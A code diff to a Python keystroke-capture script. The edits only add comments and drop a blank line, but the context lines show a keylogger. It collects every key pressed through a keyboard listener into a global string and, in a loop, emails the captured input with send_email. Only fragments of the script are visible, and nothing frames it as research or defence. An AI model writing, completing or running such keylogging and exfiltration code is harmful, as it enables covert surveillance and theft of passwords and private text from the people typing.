@@ -9,7 +9,7 @@ result = ""
 stop_listener = False
 
 def on_press(key):
-    global result, stop_listener
+    global result, stop_listener  # Ensure we are accessing the global result variable
     try:
         result += key.char
     except AttributeError:
@@ -22,7 +22,7 @@ def on_press(key):
     print(result)
 
 def function_call():
-    global stop_listener, result
+    global stop_listener, result  # Ensure we are accessing the global variables
     result = ""  # Reset result for new capture session
     stop_listener = False  # Reset stop flag
     listener = keyboard.Listener(on_press=on_press)
@@ -92,4 +92,3 @@ while True:
     
     # Send email with the captured input
     send_email(body)
-
